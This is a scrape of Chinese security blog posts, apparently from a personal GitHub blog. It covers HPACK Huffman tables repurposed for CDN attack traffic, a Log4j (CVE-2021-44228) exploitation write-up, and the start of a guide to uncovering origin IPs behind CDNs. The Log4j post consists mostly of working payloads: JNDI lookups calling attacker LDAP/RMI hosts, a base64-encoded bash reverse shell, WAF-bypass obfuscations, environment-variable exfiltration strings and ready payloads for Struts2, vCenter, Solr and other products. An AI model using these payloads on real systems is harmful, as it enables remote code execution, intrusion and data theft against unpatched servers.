|11111111|11111111|011101 3fffdd [22] (170) |11111111|11111111|011110 3fffde [22] (171) |11111111|11111111|11110000 fffff0 [24] (172) |11111111|11111110|11111 1fffdf [21] (173) |11111111|11111111|011111 3fffdf [22] (174) |11111111|11111111|1101011 7fffeb [23] (175) |11111111|11111111|1101100 7fffec [23] (176) |11111111|11111111|00000 1fffe0 [21] (177) |11111111|11111111|00001 1fffe1 [21] (178) |11111111|11111111|100000 3fffe0 [22] (179) |11111111|11111111|00010 1fffe2 [21] (180) |11111111|11111111|1101101 7fffed [23] (181) |11111111|11111111|100001 3fffe1 [22] (182) |11111111|11111111|1101110 7fffee [23] (183) |11111111|11111111|1101111 7fffef [23] (184) |11111111|11111110|1010 fffea [20] (185) |11111111|11111111|100010 3fffe2 [22] (186) |11111111|11111111|100011 3fffe3 [22] (187) |11111111|11111111|100100 3fffe4 [22] (188) |11111111|11111111|1110000 7ffff0 [23] (189) |11111111|11111111|100101 3fffe5 [22] (190) |11111111|11111111|100110 3fffe6 [22] (191) |11111111|11111111|1110001 7ffff1 [23] (192) |11111111|11111111|11111000|00 3ffffe0 [26] (193) |11111111|11111111|11111000|01 3ffffe1 [26] (194) |11111111|11111110|1011 fffeb [20] (195) |11111111|11111110|001 7fff1 [19] (196) |11111111|11111111|100111 3fffe7 [22] (197) |11111111|11111111|1110010 7ffff2 [23] (198) |11111111|11111111|101000 3fffe8 [22] (199) |11111111|11111111|11110110|0 1ffffec [25] (200) |11111111|11111111|11111000|10 3ffffe2 [26] (201) |11111111|11111111|11111000|11 3ffffe3 [26] (202) |11111111|11111111|11111001|00 3ffffe4 [26] (203) |11111111|11111111|11111011|110 7ffffde [27] (204) |11111111|11111111|11111011|111 7ffffdf [27] (205) |11111111|11111111|11111001|01 3ffffe5 [26] Peon \u0026amp; Ruellan Standards Track [Page 31] RFC 7541 HPACK May 2015 (206) |11111111|11111111|11110001 fffff1 [24] (207) |11111111|11111111|11110110|1 1ffffed [25] (208) |11111111|11111110|010 7fff2 [19] (209) |11111111|11111111|00011 1fffe3 [21] (210) |11111111|11111111|11111001|10 3ffffe6 [26] (211) |11111111|11111111|11111100|000 7ffffe0 [27] (212) |11111111|11111111|11111100|001 7ffffe1 [27] (213) |11111111|11111111|11111001|11 3ffffe7 [26] (214) |11111111|11111111|11111100|010 7ffffe2 [27] (215) |11111111|11111111|11110010 fffff2 [24] (216) |11111111|11111111|00100 1fffe4 [21] (217) |11111111|11111111|00101 1fffe5 [21] (218) |11111111|11111111|11111010|00 3ffffe8 [26] (219) |11111111|11111111|11111010|01 3ffffe9 [26] (220) |11111111|11111111|11111111|1101 ffffffd [28] (221) |11111111|11111111|11111100|011 7ffffe3 [27] (222) |11111111|11111111|11111100|100 7ffffe4 [27] (223) |11111111|11111111|11111100|101 7ffffe5 [27] (224) |11111111|11111110|1100 fffec [20] (225) |11111111|11111111|11110011 fffff3 [24] (226) |11111111|11111110|1101 fffed [20] (227) |11111111|11111111|00110 1fffe6 [21] (228) |11111111|11111111|101001 3fffe9 [22] (229) |11111111|11111111|00111 1fffe7 [21] (230) |11111111|11111111|01000 1fffe8 [21] (231) |11111111|11111111|1110011 7ffff3 [23] (232) |11111111|11111111|101010 3fffea [22] (233) |11111111|11111111|101011 3fffeb [22] (234) |11111111|11111111|11110111|0 1ffffee [25] (235) |11111111|11111111|11110111|1 1ffffef [25] (236) |11111111|11111111|11110100 fffff4 [24] (237) |11111111|11111111|11110101 fffff5 [24] (238) |11111111|11111111|11111010|10 3ffffea [26] (239) |11111111|11111111|1110100 7ffff4 [23] (240) |11111111|11111111|11111010|11 3ffffeb [26] (241) |11111111|11111111|11111100|110 7ffffe6 [27] (242) |11111111|11111111|11111011|00 3ffffec [26] (243) |11111111|11111111|11111011|01 3ffffed [26] (244) |11111111|11111111|11111100|111 7ffffe7 [27] (245) |11111111|11111111|11111101|000 7ffffe8 [27] (246) |11111111|11111111|11111101|001 7ffffe9 [27] (247) |11111111|11111111|11111101|010 7ffffea [27] (248) |11111111|11111111|11111101|011 7ffffeb [27] (249) |11111111|11111111|11111111|1110 ffffffe [28] (250) |11111111|11111111|11111101|100 7ffffec [27] (251) |11111111|11111111|11111101|101 7ffffed [27] (252) |11111111|11111111|11111101|110 7ffffee [27] (253) |11111111|11111111|11111101|111 7ffffef [27] Peon \u0026amp; Ruellan Standards Track [Page 32] RFC 7541 HPACK May 2015 (254) |11111111|11111111|11111110|000 7fffff0 [27] (255) |11111111|11111111|11111011|10 3ffffee [26] EOS (256) |11111111|11111111|11111111|111111 3fffffff [30]  参照 RFC7541 ，如果H为0，则编码数据是字符串文字的原始八位字节。 如果H是1，则编码数据是字符串文字的哈夫曼编码：\n\n根据 RFC7541 给出的哈夫曼编码译表，我们需要关注的是最后一行的 length bit ，也就是编码的长度：\n\n可见，最短的编码长度是 5 bit，将5位的字符整理出来后是：\n0 | 1 | 2 | a | c | e | i | o | s | t |  我们现在用5位的短字符来替换原来的8位长字符，这样就实现了客户端请求的压缩：\n\n这样，当我们针对同一网站不同资源做第一次动态表记录请求时，就极大幅度的缩小了自身请求的消耗，从而节约出机器资源，来发起更多的攻击连接。\n","id":16,"section":"posts","summary":"文章转载安全客，源地址：https://www.anquanke.com/post/id/231437 CDN 2021 完全攻击指南（一）中主要介绍了当下","tags":["信息收集"],"title":"CDN 2021 完全攻击指南 （二）","uri":"https://ad-calcium.github.io/2021/12/cdn-2021-%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%E4%BA%8C/","year":"2021"},{"content":"0x01 漏洞描述 Apache Log4j存在任意代码执行漏洞，经过分析，该组件存在Java JNDI注入漏洞，当程序将用户输入的数据进行日志，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。\n0x02 影响范围 Apache Log4j 2.x \u0026lt; 2.15.0-rc2\r不受影响版本\rApache Log4j 2.15.0-rc2（与官网的2.15.0稳定版相同）\rApache Log4j 2.15.1-rc1\r 0x03 供应链影响范围 Jedis\rLogging\rLogstash\rHikariCP\rHadoop Hive\rElasticSearch\rApache Solr\rApache Struts2\rApache Flink\rApache Druid\rApache Log4j SLF4J Binding\rspring-boot-strater-log4j2\rCamel :: Core\rJBoss Logging 3\rJUnit Vintage Engine\rWSO2 Carbon Kernel Core\rvmware\r更多组件可参考如下链接：\rhttps://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/usages?p=1\r 0x04 漏洞环境搭建 docker pull vulfocus/log4j2-rce-2021-12-09:latest\rdocker run -dit -p 8081:8080 vulfocus/log4j2-rce-2021-12-09\r 0x05 利用工具 https://github.com/0x727/JNDIExploit\rhttps://github.com/bolshoytoster/JNDI-Injection-Exploit\rLDAP请求监听器，摆脱dnslog平台\rhttps://github.com/r00tSe7en/JNDIMonitor\r 0x06 漏洞利用 验证是否存在漏洞 漏洞验证，使用dnslog验证网站是否存在漏洞\nhttp://10.108.0.50:58931/hello\rpayload=${jndi:ldap://9e735f2d.dns.1433.eu.org/xxxxxx}\r 执行命令 利用工具：https://github.com/ad-calcium/JNDIExploit\njava -jar JNDIExploit-1.3-SNAPSHOT.jar -i IP\r 调用不同的利用链执行命令\nPOST /hello HTTP/1.1\rHost: 10.108.0.52:8080\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rPragma: no-cache\rCache-Control: no-cache\rContent-Type: application/x-www-form-urlencoded\rcmd: pwd\rContent-Length: 68\rpayload=${jndi:ldap://123.60.xx.xx:1389/TomcatBypass/TomcatEcho}\r 反弹shell 利用工具：https://github.com/welk1n/JNDI-Injection-Exploit\n需要将反弹shell命令使用base64编码\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMDguMC41MC85OTg1IDA+JjE=}|{base64,-d}|{bash,-i}\u0026quot; -A 10.108.0.50\r 使用nc监听\n输入payload\nhttp://10.108.0.50:39428/hello\rpayload=${jndi:rmi://10.108.0.50:1099/9uf0r6}\r 成功反弹到shell\nOther ${jndi:ldap://${sys:java.version}.collaborator.com}\r${jndi:ldap://${sys:java.vendor}.@.${sys:java.version}.@.${hostName}.30ed9b7e.dns.1433.eu.org.}\r 其他变种Paylod记录如下 payload=${${::-j}ndi:ldap://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${::-j}${::-n}${::-d}${::-i}:ldap://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${lower:jndi}:ldap://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${lower:jndi}:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${lower:j}${lower:n}${lower:d}i:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${jndi:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${jndi:${lowEr:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}jndi:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}:${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}://1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}1.2.3.4:1234/TomcatBypass/TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}1.2.3.4:1234${sys:file.separator}TomcatBypass${sys:file.separator}TomcatEcho}\rpayload=${${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}1${sys:sun.cpu.isalist}.2${sys:sun.cpu.isalist}.3${sys:sun.cpu.isalist}.4${sys:sun.cpu.isalist}${sys:path.separator}1234${sys:file.separator}TomcatBypass${sys:file.separator}TomcatEcho}\rpayload{${sys:sun.cpu.isalist}j${sys:sun.cpu.isalist}n${sys:sun.cpu.isalist}d${sys:sun.cpu.isalist}i${sys:sun.cpu.isalist}${sys:path.separator}${lower:LDAP}${sys:path.separator}${sys:file.separator}${sys:file.separator}1${sys:sun.cpu.isalist}.2${sys:sun.cpu.isalist}.3${sys:sun.cpu.isalist}.4${sys:sun.cpu.isalist}${sys:path.separator}1234${sys:file.separator}TomcatBypass${sys:file.separator}TomcatEcho}r RC1绕过 ${jndi:ldap://1.2.3.4:1389/ ClassName}\r 获取敏感数据 log4j-java    ID usage method     1 ${java:version} getSystemProperty(\u0026ldquo;java.version\u0026rdquo;)   2 ${java:runtime} getRuntime()   3 ${java:vm} getVirtualMachine()   4 ${java:os} getOperatingSystem()   5 ${java:hw} getHardware()   6 ${java:locale} getLocale()    Linux    id usage     1 ${env:CLASSPATH}   2 ${env:HOME}   3 ${env:JAVA_HOME}   4 ${env:LANG}   5 ${env:LC_TERMINAL}   6 ${env:LC_TERMINAL_VERSION}   7 ${env:LESS}   8 ${env:LOGNAME}   9 ${env:LSCOLORS}   10 ${env:LS_COLORS}   11 ${env:MAIL}   12 ${env:NLSPATH}   13 ${env:OLDPWD}   14 ${env:PAGER}   15 ${env:PATH}   16 ${env:PWD}   17 ${env:SHELL}   18 ${env:SHLVL}   19 ${env:SSH_CLIENT}   20 ${env:SSH_CONNECTION}   21 ${env:SSH_TTY}   22 ${env:TERM}   23 ${env:USER}   24 ${env:XDG_RUNTIME_DIR}   25 ${env:XDG_SESSION_ID}   26 ${env:XFILESEARCHPATH}   27 ${env:ZSH}    Windows    id usage     1 ${env:A8_HOME}   2 ${env:A8_ROOT_BIN}   3 ${env:ALLUSERSPROFILE}   4 ${env:APPDATA}   5 ${env:CATALINA_BASE}   6 ${env:CATALINA_HOME}   7 ${env:CATALINA_OPTS}   8 ${env:CATALINA_TMPDIR}   9 ${env:CLASSPATH}   10 ${env:CLIENTNAME}   11 ${env:COMPUTERNAME}   12 ${env:ComSpec}   13 ${env:CommonProgramFiles}   14 ${env:CommonProgramFiles(x86)}   15 ${env:CommonProgramW6432}   16 ${env:FP_NO_HOST_CHECK}   17 ${env:HOMEDRIVE}   18 ${env:HOMEPATH}   19 ${env:JRE_HOME}   20 ${env:Java_Home}   21 ${env:LOCALAPPDATA}   22 ${env:LOGONSERVER}   23 ${env:NUMBER_OF_PROCESSORS}   24 ${env:OS}   25 ${env:PATHEXT}   26 ${env:PROCESSOR_ARCHITECTURE}   27 ${env:PROCESSOR_IDENTIFIER}   28 ${env:PROCESSOR_LEVEL}   29 ${env:PROCESSOR_REVISION}   30 ${env:PROMPT}   31 ${env:PSModulePath}   32 ${env:PUBLIC}   33 ${env:Path}   34 ${env:ProgramData}   35 ${env:ProgramFiles}   36 ${env:ProgramFiles(x86)}   37 ${env:ProgramW6432}   38 ${env:SESSIONNAME}   39 ${env:SystemDrive}   40 ${env:SystemRoot}   41 ${env:TEMP}   42 ${env:TMP}   43 ${env:ThisExitCode}   44 ${env:USERDOMAIN}   45 ${env:USERNAME}   46 ${env:USERPROFILE}   47 ${env:WORK_PATH}   48 ${env:windir}   49 ${env:windows_tracing_flags}   50 ${env:windows_tracing_logfile}    log4j2-sys    id usage     1 ${sys:awt.toolkit}   2 ${sys:file.encoding}   3 ${sys:file.encoding.pkg}   4 ${sys:file.separator}   5 ${sys:java.awt.graphicsenv}   6 ${sys:java.awt.printerjob}   7 ${sys:java.class.path}   8 ${sys:java.class.version}   9 ${sys:java.endorsed.dirs}   10 ${sys:java.ext.dirs}   11 ${sys:java.home}   12 ${sys:java.io.tmpdir}   13 ${sys:java.library.path}   14 ${sys:java.runtime.name}   15 ${sys:java.runtime.version}   16 ${sys:java.specification.name}   17 ${sys:java.specification.vendor}   18 ${sys:java.specification.version}   19 ${sys:java.vendor}   20 ${sys:java.vendor.url}   21 ${sys:java.vendor.url.bug}   22 ${sys:java.version}   23 ${sys:java.vm.info}   24 ${sys:java.vm.name}   25 ${sys:java.vm.specification.name}   26 ${sys:java.vm.specification.vendor}   27 ${sys:java.vm.specification.version}   28 ${sys:java.vm.vendor}   29 ${sys:java.vm.version}   30 ${sys:line.separator}   31 ${sys:os.arch}   32 ${sys:os.name}   33 ${sys:os.version}   34 ${sys:path.separator}   35 ${sys:sun.arch.data.model}   36 ${sys:sun.boot.class.path}   37 ${sys:sun.boot.library.path}   38 ${sys:sun.cpu.endian}   39 ${sys:sun.cpu.isalist}   40 ${sys:sun.desktop}   41 ${sys:sun.io.unicode.encoding}   42 ${sys:sun.java.command}   43 ${sys:sun.java.launcher}   44 ${sys:sun.jnu.encoding}   45 ${sys:sun.management.compiler}   46 ${sys:sun.os.patch.level}   47 ${sys:sun.stderr.encoding}   48 ${sys:user.country}   49 ${sys:user.dir}   50 ${sys:user.home}   51 ${sys:user.language}   52 ${sys:user.name}   53 ${sys:user.script}   54 ${sys:user.timezone}   55 ${sys:user.variant}    WAF Bypass ${jndi:ldap://127.0.0.1:1389/a}\r${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ceye.io/a}\r${${::-j}ndi:rmi://ceye.io/a}\r${jndi:rmi://ceye.io}\r${${lower:jndi}:${lower:rmi}://ceye.io/a}\r${${lower:${lower:jndi}}:${lower:rmi}://ceye.io/a}\r${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://ceye.io/a}\r${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://ceye.io/a}\r${${upper:jndi}:${upper:rmi}://ceye.io/a}\r${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://ceye.io/a}\r${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://ceye.io/a}\r${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.ceye.io}\r${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.ceye.io}\r${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.ceye.io\r 其它已知受影响组件可利用的payload Apache struts2\rhttp://127.0.0.1:8080/struts2-showcase/token/transfer4.action -d struts.token.name='${jndi:rmi://127.0 .0.1:1099/ylbtsl}'\rhttp://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/\rVMWare VCenter\r\u0026quot;X-Forwarded-For: \\${jndi:ldap://10.0.0.3:1270/lol}\u0026quot; \u0026quot;https://10.0.0.4/websso/SAML2/SSO/photon- machine.lan?SAMLRequest=\u0026quot;\rApache James\r\u0026quot;smtp://localhost\u0026quot; --user \u0026quot;test:test\u0026quot; --mail-from '${jndi:ldap://localhost:1270/a}@gmail.com' --mail-rcpt 'test' --upload-file email.txt\rApache Solr\r'http://localhost:8983/solr/admin/cores?action=CREATE\u0026amp;name=$%7Bjndi:ldap://10.0.0.6:1270/abc%7D\u0026amp;wt=json'\rsolr/admin/info/system?_=${jndi:ldap://192.168.1.1/exp}\u0026amp;wt=json\rApache Druid\r'http://localhost:8888/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2flocalhost:1270%2fabc%7d'\rApache JSPWiki\rhttp://localhost:8080/JSPWiki/wiki/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/\rApache OFBiz\r\u0026quot;Cookie: OFBiz.Visitor=\\${jndi:ldap://localhost:1270/abc}\u0026quot; https://localhost:8443/webtools/control/main\r 参考地址\nhttps://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words\r ","id":17,"section":"posts","summary":"0x01 漏洞描述 Apache Log4j存在任意代码执行漏洞，经过分析，该组件存在Java JNDI注入漏洞，当程序将用户输入的数据进行日志，即可触发此漏洞，成","tags":["漏洞复现"],"title":"Apache Log4j任意代码执行漏洞","uri":"https://ad-calcium.github.io/2021/12/apache-log4j%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"文章转载安全客，源地址：https://www.anquanke.com/post/id/227818\n 这是一篇全网（无论国内还是国外）最全、最详细、最新、最实用的关于 CDN 网络对抗攻击的文章，渗透测试中若碰到 CDN 类的问题，只需要看这一篇指南即可。我也会在 Github 长期保持此文的更新，更新与修正新的对抗技术、工具和网站。\n  Content Delivery Network，中文全称为内容分发网络，简称为 CDN 。\n  使用 CDN 技术可以有效的提高网站的访问速度和安全性，因此目前互联网上，超过 50％ 的 Alexa 前 1000 网站和超过 35％ 的 Alexa 前 10000 的网站都部署在 CDN 网络后面，所有请求网站内容的用户都将从最近的 CDN 代理服务器获取其缓存版本，因此内容加载速度更快，网站的性能得到改善。\n  具体 CDN 的相关原理网上都有阐述，有兴趣的读者可以去自行了解，本篇指南旨在攻击，追求简洁、高效、实用，就不再多赘述一些概念性相关的东西了。\n  0x01 常见 CDN 服务商 一、国内 CDN 服务商  阿里云 CDN 百度云 CDN 七牛云 CDN 又拍云 CDN 腾讯云 CDN Ucloud 360 CDN 网宿科技 ChinaCache 帝联科技  二、国外 CDN 服务商  CloudFlare StackPath Fastly Akamai CloudFront Edgecast CDNetworks Google Cloud CDN CacheFly Keycdn Udomain CDN77  0x02 判断网站是否使用了CDN  反查域名 IP，看结果是否有大量不相关的域名存在 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 使用超级 ping，通过不同定位地点的 ping 测试，看返回的 IP 是否不同 判断 IP 是否在常见 CDN 服务商的服务器 IP 段上 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 利用 Nslookup 查询域名，看是否返回多个应答 IP  0x03 如何绕过 CDN 朔源网站真实 IP 一、通过查询 DNS 记录 / IP 历史记录 / 子域名 等数据记录  很多网站只给关键的域名或者主域名做了 CDN，其下很多子域名没有使用 CDN 服务，所以我们可以通过查询目标网站的根域名、二级域名、三级域名甚至多级子域名来获得真实IP。不过有时候查出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可以继续扫描同 C 段的 IP 和端口，然后逐个探测是否为目标网站。 在网站使用 CDN 服务之前，解析的是真实IP，所以可以查询 DNS 历史记录，看是否能探测到使用 CDN 之前的 IP 。 DNS 解析记录中重点关注 TXT 记录和 SPF 记录，是否有泄露真实IP。  1、在线查询平台 1.SecurityTrails （https://securitytrails.com/）\nSecurityTrails（前身为 DNS Trails）拥有大约3.5万亿DNS记录，3亿whois记录，8亿SSL证书记录以及超过4.5亿子域的记录数据。自2008年以来，网站每天都收集和更新海量数据。\nSecurityTrails 是我最常用的平台之一，免费、精准，数据量极其庞大，足够支撑日常。\nDNS 记录：\nIP历史：\n子域名：\n2.Complete DNS（https://completedns.com/）\nComplete DNS 拥有超过 22 亿个DNS变更记录，提供API，支持同时进行多域名/IP查询。\n3.WhoISrequest （https://whoisrequest.com/）\nWhoISrequest 这个网站自2002年以来一直在跟踪和记录DNS历史变更，数据底蕴很足。\n这种时间线设计的UI风格很不戳，点赞。\n4.Whoxy（https://www.whoxy.com/）\nWhoxy 拥有爬取超过 3.65亿个子域数据，该网站 API 调用非常方便，以 XML 和 JSON 格式返回数据。\n5.微步Threatbook（https://x.threatbook.cn/）\nThreatbook 微步在线针对 IP、域名 进行综合查询威胁情报、历史记录、子域名解析、DNS解析等等信息，支持 API 查询，非常方便。\nNetcraft（https://netcraft.com/）  Netcraft 不用多说了吧，很多人都知道，不过仁者见仁智者见智吧，经过时代的变迁，Netcraft 也不是曾经的那个少年了，这里只是提一下，仅供参考。\nViewdns（https://viewdns.info/）  Viewdns 可以说是非常的简洁直观了，就算你不懂任何英文，我相信你也看的懂，至少你知道在哪里输入对吧。响应速度也是非常快了，首页一目了然，集成了超多的查询功能。\n找你需要的功能查询就好，用网站提供的 API 也可以\n8.Whoisxmlapi（https://reverse-ip.whoisxmlapi.com/）\nWhoisxmlapi 数据库包含了超过1.4亿多个域名生态数据，用来反查 IP 和 DNS 数据，在绕过 CDN 时候做反向对比非常有用。网站和 whoxy 一样，也是以 XML 和 JSON 格式返回数据，支持自定义。\nDnsdb（https://dnsdb.io/）  Dnsdb 功能非常强大，老平台了，也是我常用平台之一。\n搜索前可以先简单学习一下搜索语法：\n觉得难？不想学？那也没关系，站长已经考虑到你这种懒人情况了，首页就有给懒人准备的搜索构造器，十分友好：\n10.SubDomainTools（https://ruo.me/sub）\n在线子域名查询，支持实时模式和后台模式，不阻塞前端线程，不占CPU，小测试的时候非常方便。\n2、IOT 物联网络空间测绘搜索引擎 1.Censys（https://censys.io/）\nCensys 可帮助安全从业人员发现可从Internet访问的设备，包括 IP 地址、开放端口、物理定位、域名信息、托管服务商、SSL 证书 等等数据，从中发现需要的信息追踪到网站真实的 IP 地址。\n2.FOFA（https://fofa.so/）\nFOFA 可以迅速进行网站资产匹配，加快后续工作进程，如漏洞影响范围分析，应用分布统计，应用流行度排名统计等。FOFA 非常友好，即使免费，也可以查询足够多的数据量，只要你不是商用或者大需求用户，是不需要开会员的。\n3.Shodan（https://www.shodan.io/）\nShodan 被称为互联网上最强大的搜索引擎，主要是用来搜索网络空间中在线设备的，可以通过 Shodan 搜索指定的设备，或者搜索特定类型的设备，它可以帮助安全研究人员找到有关他们所研究目标的有用信息。\n语法特别强大，建议搜索前好好浏览一下筛选器文档，可以达到事半功倍的效果。\n4.Zoomeye\nZoomeye，钟馗之眼，知道创宇打造的宇宙级网络空间搜索引擎，Shodan 侧重于主机设备，Zoomeye 则偏向于 Web 发现。\n3、工具和脚本 1.SubDomainsBrute\n项目地址：https://github.com/lijiejie/subDomainsBrute\nSubDomainsBrute 是通过纯 DNS 爆破来寻找子域名，为了最大提升脚本效率，采用协程+多进程的方式进行爆破。Python 3.5 以上需要安装 aiodns 库进行异步查询，python 2 需要安装 dnspython 库和 gevent 协程库。\n之前是不支持扫描泛解析域名的，10月份作者更新已经支持泛解析，使用 -w 参数。\n如图，我们针对一个泛解析的域名进行爆破，subDomainsBrute 会提示 any-sub 错误，之后使用 -w 参数开启泛解析强制爆破：\n2.ESD\n项目地址：https://github.com/FeeiCN/ESD\n相比于的暴力收集手段，ESD 在很多方面有独特的想法。\n 基于RSC（响应相似度对比）技术对泛解析域名进行枚举。 基于aioHTTP获取一个不存在子域名的响应内容，并将其和字典子域名响应进行相似度比对，超过阈值则说明是同个页面，否则为可用子域名，并对最终子域名再次进行响应相似度对比。 基于AsyncIO异步协程技术对域名进行枚举。 基于AsyncIO+aioDNS将比传统多进程/多线程/gevent模式快50%以上。 解决各家DNS服务商对于网络线路出口判定不一致问题。 解决各家DNS服务商缓存时间不一致问题。 解决随机DNS问题。 根据网络情况自动剔除无效DNS，提高枚举成功率。  ESD 通过使用文本相似度，判断阈值的方法来过滤泛解析，这种方法现在看来很笨重，我们可以自己修改脚本，否则因此会导致机器的内存、CPU都负荷，对机器性能要求比较高，且不支持 python2。\npython3 环境下通过 pip 直接安装：\n$ pip install esd  基本用法（项目官方给出）:\n# 扫描单个域名 esd -d qq.com # debug模式扫描单个域名 esd=debug esd -d qq.com # 扫描多个域名（英文逗号分隔） esd --domain qq.com,tencent.com # 扫描单个域名且过滤子域名中单个特定响应内容 esd --domain mogujie.com --filter 搜本店 # 扫描单个域名且过滤子域名中多个特定响应内容 esd --domain mogujie.com --filter 搜本店,收藏店铺 # 扫描文件（文件中每行一个域名） esd --file targets.txt # 跳过相似度对比（开启这个选项会把所有泛解析的域名都过滤掉） esd --domain qq.com --skip-rsc # 使用搜索引擎进行子域名搜索（支持baidu、google、bing、yahoo，使用英文逗号分隔） esd --domain qq.com --engines baidu,google,bing,yahoo # 平均分割字典，加快爆破 esd --domain qq.com --split 1/4 # 使用DNS域传送漏洞获取子域名 esd --domain qq.com --dns-transfer # 使用HTTPS证书透明度获取子域名 esd --domain qq.com --ca-info  但是实际上我们从源码出发，发现很多功能作者目前并未实现：\nparser = OptionParser('Usage: python ESD.py -d feei.cn -F response_filter -e baidu,google,bing,yahoo -p user:pass@host:port') parser.add_option('-d', '--domain', dest='domains', help='The domains that you want to enumerate') parser.add_option('-f', '--file', dest='input', help='Import domains from this file') parser.add_option('-F', '--filter', dest='filter', help='Response filter') parser.add_option('-s', '--skip-rsc', dest='skiprsc', help='Skip response similary compare', action='store_true', default=False) parser.add_option('-S', '--split', dest='split', help='Split the dict into several parts', default='1/1') parser.add_option('-p', '--proxy', dest='proxy', help='Use socks5 proxy to access Google and Yahoo') parser.add_option('-m', '--multi-resolve', dest='multiresolve', help='Use TXT, AAAA, MX, SOA record to find subdomains', action='store_true', default=False) parser.add_option('--skey', '--shodan-key', dest='shodankey', help='Define the api of shodan') parser.add_option('--fkey', '--fofa-key', dest='fofakey', help='Define the key of fofa') parser.add_option('--femail', '--fofa-email', dest='fofaemail', help='The email of your fofa account') parser.add_option('--zusername', '--zoomeye-username', dest='zoomeyeusername', help='The username of your zoomeye account') parser.add_option('--zpassword', '--zoomeye-password', dest='zoomeyepassword', help='The password of your zoomeye account') parser.add_option('--cuid', '--censys-uid', dest='censysuid', help=\u0026quot;The uid of your censys account\u0026quot;) parser.add_option('--csecret', '--censys-secret', dest='censyssecret', help='The secret of your censys account') (options, args) = parser.parse_args()  不难发现 通过 HTTPS 证书透明度、域传送漏洞 等功能均未实现。\nESD 目前仅支持 Linux 系统，这是其源码决定的，不过我们可以 DIY 让它支持 windows\n可以看到，engine.py 引擎脚本中，写死了目录是 /tmp/esd ，如果要在 windows 上使用，我们只需要替换这里为 windows 的输出目录即可。\n# write output tmp_dir = 'C:\\\\temp\\\\' if not os.path.isdir(tmp_dir): os.mkdir(tmp_dir, 0o777) output_path_with_time = '{td}/.{domain}_{time}.esd'.format(td=tmp_dir, domain=self.domain, time=datetime.datetime.now().strftime(\u0026quot;%Y-%m_%d_%H-%M\u0026quot;)) output_path = '{td}/.{domain}.esd'.format(td=tmp_dir, domain=self.domain) if len(self.data): max_domain_len = max(map(len, self.data)) + 2 else: max_domain_len = 2 output_format = '%-{0}s%-s\\n'.format(max_domain_len) with open(output_path_with_time, 'w') as opt, open(output_path, 'w') as op: for domain, ips in self.data.items(): # The format is consistent with other scanners to ensure that they are # invoked at the same time without increasing the cost of # resolution if ips is None or len(ips) == 0: ips_split = '' else: ips_split = ','.join(ips) con = output_format % (domain, ips_split) op.write(con) 